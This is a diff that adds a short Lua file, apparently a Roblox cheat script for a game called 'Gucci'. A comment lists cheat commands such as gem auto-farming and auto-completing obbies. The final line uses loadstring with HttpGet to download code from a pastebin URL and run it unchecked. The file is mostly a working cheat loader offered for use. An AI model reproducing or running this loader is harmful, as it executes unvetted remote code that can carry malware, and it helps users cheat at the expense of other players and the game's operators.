@@ -1,0 +1,14 @@
+--[[
+--GUCCI GAME SCRIPT MADE BY SHOOTOUTS AKA HOLLYWOODSHOOTOUTS--
+-- shootouts#0001 --
+
+PREFIX IS "."
+CMDS:
+join (joins minigames)
+shop (broken)
+oversized glasses (gives oversized)
+autogem(autofarms gems)
+autovictory(auto does obbys etc)
+letters (collects letters)
+]]--
+loadstring(game:HttpGet('https://pastebin.com/raw/jXQ90qK9')())
